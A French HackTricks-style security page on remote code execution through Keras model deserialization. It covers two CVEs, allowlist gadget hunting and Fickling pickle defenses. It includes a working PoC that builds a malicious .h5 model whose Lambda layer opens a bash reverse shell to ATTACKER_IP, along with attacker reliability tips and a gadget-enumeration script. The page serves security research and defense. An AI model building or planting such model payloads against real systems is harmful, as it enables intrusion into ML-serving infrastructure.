# RCE lors de la désérialisation des modèles Keras et recherche de gadgets

{{#include ../../banners/hacktricks-training.md}}

Cette page résume les techniques pratiques d'exploitation du pipeline de désérialisation des modèles Keras, explique les composants internes et la surface d'attaque du format natif `.keras`, et fournit aux chercheurs une boîte à outils pour trouver des Model File Vulnerabilities (MFVs) et des gadgets post-fix.

## Composants internes du format de modèle `.keras`

Un fichier `.keras` est une archive ZIP contenant au minimum :<sup>[[1]](#references)</sup>
- metadata.json – informations génériques (par exemple, la version de Keras)
- config.json – architecture du modèle (principale surface d'attaque)
- model.weights.h5 – poids au format HDF5

Le fichier config.json pilote la désérialisation récursive : Keras importe des modules, résout les classes/fonctions et reconstruit les layers/objets à partir de dictionnaires contrôlés par l'attaquant.<sup>[[1]](#references)</sup>

Extrait d'exemple pour un objet de layer Dense :
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
La désérialisation effectue :<sup>[[1]](#references)</sup>
- L’import de modules et la résolution de symboles à partir des clés module/class_name
- L’appel de from_config(...) ou du constructeur avec des kwargs contrôlés par l’attaquant
- La récursion dans les objets imbriqués (activations, initializers, constraints, etc.)

Historiquement, cela exposait trois primitives à un attaquant concevant config.json :<sup>[[1]](#references)</sup>
- Le contrôle des modules importés
- Le contrôle des classes/fonctions résolues
- Le contrôle des kwargs transmis aux constructeurs/from_config

## CVE-2024-3660 – RCE via le bytecode d’une Lambda-layer

Cause racine :
- Lambda.from_config() utilisait python_utils.func_load(...), qui décode en base64 puis appelle marshal.loads() sur les octets fournis par l’attaquant ; le unmarshalling Python peut exécuter du code.<sup>[[1]](#references)[[3]](#references)</sup>

Idée d’exploit (payload simplifié dans config.json) :
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation :
- Keras impose `safe_mode=True` par défaut. Les fonctions Python sérialisées dans Lambda sont bloquées, sauf si l’utilisateur désactive explicitement cette protection avec `safe_mode=False`.<sup>[[1]](#references)</sup>

Notes :
- Les formats legacy (anciens enregistrements HDF5) ou les codebases plus anciennes peuvent ne pas appliquer les vérifications modernes. Les attaques de type « downgrade » peuvent donc toujours fonctionner lorsque les victimes utilisent d’anciens loaders.

## CVE-2025-1550 – Arbitrary module import in Keras ≤ 3.8

Root cause :
- `_retrieve_class_or_fn` utilisait `importlib.import_module()` sans restriction, avec des chaînes de modules contrôlées par l’attaquant depuis `config.json`.
- Impact : import arbitraire de n’importe quel module installé (ou d’un module placé par l’attaquant dans `sys.path`). Le code exécuté lors de l’import s’exécute, puis la construction de l’objet a lieu avec les kwargs contrôlés par l’attaquant.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Exploit idea :
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Améliorations de sécurité (Keras ≥ 3.9) :<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist : imports limités aux modules de l’écosystème officiel : keras, keras_hub, keras_cv, keras_nlp
- Safe mode par défaut : safe_mode=True bloque le chargement non sécurisé de fonctions sérialisées Lambda
- Vérification basique des types : les objets désérialisés doivent correspondre aux types attendus

## Exploitation pratique : TensorFlow-Keras HDF5 (.h5) Lambda RCE

De nombreuses stacks de production acceptent encore les fichiers de modèle TensorFlow-Keras HDF5 legacy (.h5). Si un attaquant peut upload un modèle que le serveur chargera ensuite ou sur lequel il exécutera une inférence, une couche Lambda peut exécuter du Python arbitraire lors du chargement, de la construction ou de la prédiction.<sup>[[7]](#references)</sup>

PoC minimal pour créer un fichier .h5 malveillant qui exécute un reverse shell lors de sa désérialisation ou de son utilisation :
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notes et conseils de fiabilité :
- Points de déclenchement : le code peut s’exécuter plusieurs fois (par exemple, lors de la construction de la couche/du premier appel, de `model.load_model` et de `predict`/`fit`). Rendez les payloads idempotents.<sup>[[7]](#references)</sup>
- Verrouillage des versions : faites correspondre les versions de TF/Keras/Python de la victime afin d’éviter les incompatibilités de sérialisation. Par exemple, construisez les artefacts sous Python 3.8 avec TensorFlow 2.13.1 si c’est ce qu’utilise la cible.<sup>[[7]](#references)</sup>
- Réplication rapide de l’environnement :
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validation : un payload bénin comme os.system("ping -c 1 YOUR_IP") aide à confirmer l’exécution (par exemple, en observant l’ICMP avec tcpdump) avant de passer à un reverse shell.<sup>[[7]](#references)</sup>

## Surface de gadgets après correctif dans l’allowlist

Même avec une allowlist et le safe mode, une large surface demeure parmi les callables Keras autorisés. Par exemple, keras.utils.get_file peut télécharger des URLs arbitraires vers des emplacements sélectionnés par l’utilisateur.<sup>[[1]](#references)</sup>

Gadget via Lambda qui référence une fonction autorisée (et non du bytecode Python sérialisé) :
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Important limitation:
- Lambda.call() ajoute le tenseur d’entrée comme premier argument positionnel lors de l’appel du callable cible. Les gadgets choisis doivent tolérer un argument positionnel supplémentaire (ou accepter *args/**kwargs). Cela limite les fonctions viables.<sup>[[1]](#references)</sup>

## ML pickle import allowlisting pour les modèles AI/ML (Fickling)

De nombreux formats de modèles AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, anciens artefacts TensorFlow, etc.) intègrent des données Python pickle. Les attaquants exploitent régulièrement les imports pickle GLOBAL et les constructeurs d’objets pour obtenir une RCE ou effectuer un model swapping pendant le chargement. Les scanners fondés sur des blacklists manquent souvent les imports dangereux nouveaux ou non répertoriés.<sup>[[8]](#references)[[14]](#references)</sup>

Une défense pratique en mode fail-closed consiste à intercepter le désérialiseur pickle de Python et à n’autoriser, pendant la désérialisation, qu’un ensemble vérifié d’imports inoffensifs liés au ML. Le Fickling de Trail of Bits applique cette politique et fournit une allowlist d’imports ML élaborée à partir de milliers de pickles publics provenant de Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Modèle de sécurité pour les imports « sûrs » (intuitions synthétisées à partir de la recherche et de la pratique) : les symboles importés utilisés par un pickle doivent simultanément :<sup>[[8]](#references)</sup>
- Ne pas exécuter de code ni provoquer d’exécution (pas d’objets de code compilés ou source, pas d’exécution de commandes shell, pas de hooks, etc.)
- Ne pas obtenir ni définir des attributs ou éléments arbitraires
- Ne pas importer d’autres objets Python depuis la pickle VM ni obtenir de références vers ceux-ci
- Ne déclencher aucun désérialiseur secondaire (par ex. marshal, pickle imbriqué), même indirectement

Activez les protections de Fickling le plus tôt possible au démarrage du processus afin que tous les chargements pickle effectués par les frameworks (torch.load, joblib.load, etc.) soient vérifiés :<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Conseils opérationnels :
- Vous pouvez désactiver/réactiver temporairement les hooks lorsque nécessaire :<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Si un modèle réputé fiable est bloqué, étendez l’allowlist pour votre environnement après avoir examiné les symboles :<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling expose également des protections génériques à l’exécution si vous préférez un contrôle plus granulaire :<sup>[[9]](#references)</sup>
- `fickling.always_check_safety()` pour imposer des vérifications à tous les `pickle.load()`
- `with fickling.check_safety():` pour une application limitée à une portée donnée
- `fickling.load(path)` / `fickling.is_likely_safe(path)` pour des vérifications ponctuelles

- Privilégiez les formats de modèles autres que pickle lorsque cela est possible (par ex. SafeTensors).<sup>[[15]](#references)</sup> Si vous devez accepter pickle, exécutez les loaders avec le moins de privilèges possible, sans sortie réseau, et imposez l’allowlist.

Cette stratégie axée sur l’allowlist bloque de manière démontrable les chemins d’exploitation courants de pickle dans le domaine du ML, tout en conservant une compatibilité élevée. Dans le benchmark de ToB, Fickling a détecté 100 % des fichiers malveillants synthétiques et autorisé environ 99 % des fichiers propres provenant des principaux dépôts Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Boîte à outils du chercheur

1) Découverte systématique de gadgets dans les modules autorisés

Énumérez les callables candidats dans keras, keras_nlp, keras_cv, keras_hub et donnez la priorité à ceux ayant des effets de bord sur les fichiers, le réseau, les processus ou l’environnement.<sup>[[1]](#references)</sup>

<details>
<summary>Énumérer les callables potentiellement dangereux dans les modules Keras figurant dans l’allowlist</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Test direct de désérialisation (aucune archive .keras nécessaire)

Transmettez des dictionnaires conçus directement aux désérialiseurs Keras afin d'identifier les paramètres acceptés et d'observer les effets de bord.<sup>[[1]](#references)</sup>
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Sondage interversions et formats

Keras existe dans plusieurs codebases/ères avec des garde-fous et des formats différents :<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, voué à être supprimé)
- tf-keras: maintenu séparément
- Multi-backend Keras 3 (official): a introduit le format natif .keras

Répétez les tests sur les différentes codebases et différents formats (.keras contre HDF5 legacy) afin de révéler les régressions ou les garde-fous manquants.

## Références

- [1] [Recherche de vulnérabilités dans la désérialisation des modèles Keras (blog huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Ajout de contrôles à la sérialisation](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE lors de la désérialisation de Keras Lambda](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Import arbitraire de modules Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [Rapport huntr – import arbitraire n° 1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [Rapport huntr – import arbitraire n° 2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – RCE Lambda TensorFlow .h5 vers root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Blog Trail of Bits – Le nouveau scanner de fichiers pickle AI/ML de Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Sécurisation des environnements AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Corpus de référence pour le scanning pickle de Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Contexte des attaques Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Projet SafeTensors](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
